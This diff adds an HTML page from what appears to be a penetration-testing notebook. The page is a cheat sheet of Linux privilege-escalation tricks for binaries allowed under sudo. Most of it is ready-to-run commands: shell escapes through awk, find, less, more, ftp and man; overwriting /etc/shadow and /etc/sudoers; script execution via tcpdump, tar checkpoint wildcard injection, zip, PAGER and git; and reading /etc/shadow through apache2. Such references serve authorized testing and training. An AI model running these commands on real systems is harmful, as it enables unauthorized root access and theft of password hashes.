@@ -1,0 +1,73 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Excessive / Dangerous Binaries Allowed</title>
+</head><body>If you have sudo access to certain commands, it can allow you to fully escalate privs. Also check out the binaries in <a href="../../rbash%20-%20restricted%20shell/page.html">rbash / restricted shell</a><br/>
+<br/>
+cp<br/>
+	Overwrite /etc/shadow or /etc/sudoers 	#please make a backup first<br/>
+awk<br/>
+	awk 'BEGIN {system(&quot;/bin/bash&quot;)}'<br/>
+bash<br/>
+	bash -i<br/>
+find #make sure the file can be found!<br/>
+	find / -name /etc/passwd -exec bash -i \; <br/>
+	find / -name /etc/passwd -exec /usr/bin/awk 'BEGIN {system(&quot;/bin/bash&quot;)}' \;<br/>
+less<br/>
+	From less, you can go into vi and then into shell<br/>
+	less /etc/shadow<br/>
+	v<br/>
+	:shell<br/>
+less<br/>
+	If less can 'sudo /file/log/*', you can either use file/log/../../etc/shadow or the :n switch, etc<br/>
+more<br/>
+	run more on a file larger than your screen<br/>
+	!/bin/bash<br/>
+mv<br/>
+	Overwrite /etc/shadow or /etc/sudoers 	#please make a backup first<br/>
+Many more binaries you can exec in (see <a href="../../rbash%20-%20restricted%20shell/page.html">rbash</a>page)<br/>
+Programming language? See reverse shells section<br/>
+sh<br/>
+<br/>
+tcpdump<ul><li style="list-style-type: none">echo $'id\ncat /etc/shadow' &gt; /tmp/.test</li>
+<li style="list-style-type: none">chmod +x /tmp/.test</li>
+<li style="list-style-type: none">sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">or another</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh</li>
+<li style="list-style-type: none"/>
+</ul>
+tar<br/>
+	tar c a.tar -I ./runme.sh a<br/>
+<br/>
+	or <br/>
+<ul><li style="list-style-type: none">--checkpoint=&lt;number&gt; and --checkpoint-action=&lt;command&gt; where checkpoint corresponds to a specific number of files that should be handled by tar before performing the action</li>
+<li style="list-style-type: none">if you cannot edit the tar command, you can create files on the system for wildcard injection</li>
+<li style="list-style-type: none">touch &quot;-checkpoint-action=exec=sh rshell.sh&quot;</li>
+<li style="list-style-type: none">touch &quot;-checkpoint=1&quot;</li>
+</ul>
+zip<br/>
+	zip z.zip a -T -TT ./runme.sh<br/>
+ftp<br/>
+	ftp&gt; ! ./runme.sh<br/>
+man<br/>
+	man -P /tmp/runme.sh man<br/>
+<br/>
+environment variables!<ul><li style="list-style-type: none">export PAGER=./runme.sh</li>
+<li style="list-style-type: none">git -p help</li>
+<li style="list-style-type: none">git, man, etc programs. Anything that can use the PAGER env variable</li>
+<li style="list-style-type: none"/>
+</ul>
+git<br/>
+	export PATH=/tmp:$PATH<ul><li style="list-style-type: none">ln -sf /tmp/runme.sh /tmp/git-help</li>
+<li style="list-style-type: none">git --exec-path=/tmp help</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">--exec-path must be in $PATH in order to be executed</li>
+<li style="list-style-type: none"/>
+</ul>
+<br/>
+<br/>
+Apache (-f uses directives in the file config on startup)<br/>
+	sudo apache2 -f /etc/shadow<br/>
+	to host a protected file that you can then view</body></html>
